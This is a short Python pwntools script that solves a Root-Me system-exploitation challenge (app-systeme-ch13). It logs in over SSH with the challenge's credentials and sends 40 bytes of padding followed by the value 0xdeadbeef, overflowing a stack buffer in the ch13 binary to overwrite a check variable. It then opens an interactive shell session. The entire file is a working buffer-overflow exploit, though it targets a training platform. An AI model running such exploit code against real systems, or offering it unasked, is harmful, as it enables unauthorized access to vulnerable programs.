from pwn import *


context.arch      = "i386"
context.os        = "linux"
context.endian    = "little"
context.word_size = 32

s = ssh(host="challenge02.root-me.org", port=2222, user="app-systeme-ch13", password="app-systeme-ch13")
io = s.process(executable="./ch13", argv="")
io.sendline("A" * 40 + p32(0xdeadbeef))
io.recvline(timeout=0.1)
io.interactive()
io.close()
s.close()